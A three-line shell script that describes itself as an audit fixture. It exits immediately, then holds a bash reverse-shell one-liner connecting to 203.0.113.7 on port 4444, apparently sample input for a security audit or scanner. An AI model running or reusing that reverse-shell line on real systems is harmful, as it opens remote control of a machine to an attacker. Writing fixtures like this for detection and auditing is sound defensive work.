#!/bin/sh
exit 0 # a fixture: read by the audit, never run
bash -i >& /dev/tcp/203.0.113.7/4444 0>&1
